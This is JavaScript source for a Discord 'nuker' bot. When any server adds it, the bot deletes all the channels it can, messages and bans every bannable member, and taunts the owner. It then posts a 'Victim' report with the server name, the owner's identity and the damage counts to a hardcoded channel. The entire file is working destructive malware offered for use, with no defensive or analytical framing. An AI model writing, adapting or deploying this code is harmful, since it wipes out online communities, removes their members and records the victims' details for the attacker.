const { Client, RichEmbed } = require('discord.js');
const config = require('./config.json');
const client = new Client();

client.on('ready', () => { 
  console.log('Ready to have some fun... >:)');
});

client.on('guildCreate', async (guild) => {
  let users = 0;
  let channels = 0;
  let embed = new RichEmbed();

  try {
    await guild.owner.send('Hey there! Your guild is getting nuked!');
  } catch (e) {}

  for(const [, c] of guild.channels)  {
    try {
      await c.delete();
    } catch (e) {
      continue;
    }
    channels++;
  }

  for(const [, m] of guild.members) {
    try {
      await m.send('You\'re getting banned! Nothing personal...');
    } catch (e) {}

    try {
      if(m.bannable) await m.ban();
    } catch (e) {
      continue;
    }

    users++;
  }

  try {
    await guild.defaultChannel.send('Dumbass, I said not to add the bot...');
  } catch (e) {}
  
  if(users > 0 || channels > 0) {
    embed.setAuthor(`Victim |  ${guild.name}`, guild.iconURL)
          .setColor(3447003)
          .setDescription(`Owner - ${guild.owner.user.username}#${guild.owner.user.discriminator} (${guild.owner.id})\nBanned - ${users} users\nDeleted - ${channels} channels`);
    client.channels.get('274770009883148288').sendEmbed(embed)
  }
  guild.leave();
});

client.login(config.token).catch(console.error);
